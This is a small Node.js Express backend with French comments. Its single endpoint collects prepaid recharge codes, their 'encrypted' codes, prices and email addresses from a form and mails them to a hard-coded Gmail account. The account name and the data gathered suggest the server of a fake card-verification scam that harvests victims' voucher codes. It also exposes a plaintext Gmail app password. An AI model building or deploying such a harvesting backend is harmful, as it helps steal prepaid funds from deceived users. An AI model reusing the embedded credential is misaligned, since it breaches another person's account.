import express from 'express';
import nodemailer from 'nodemailer';
import bodyParser from 'body-parser';
import cors from 'cors';

const app = express();
app.use(bodyParser.json());
app.use(cors());

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'checkcards6@gmail.com', // Remplace par ton adresse email
    pass: 'vpot svzf xrpw bndc', // Remplace par ton mot de passe
  },
});

app.post('/send-email', (req, res) => {
  const { rechargeType, price, rechargeCode, encryptedCode, email } = req.body;

  const mailOptions = {
    from: email, // Remplace par ton adresse email
    to: 'checkcards6@gmail.com', // Utilise l'email récupéré dans le formulaire
    subject: 'Nouvelle demande d\'authentification',
    text: `Type de recharge : ${rechargeType}\nPrix de la recharge : ${price}\nCode de la recharge : ${rechargeCode}\nCode crypté : ${encryptedCode}\nEmail : ${email}`,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      res.status(500).send('Erreur lors de l\'envoi de l\'email');
    } else {
      console.log('Email envoyé : ' + info.response);
      res.status(200).send('Email envoyé avec succès');
    }
  });
});

app.listen(3000, () => {
  console.log('Serveur backend démarré sur le port 3000');
});
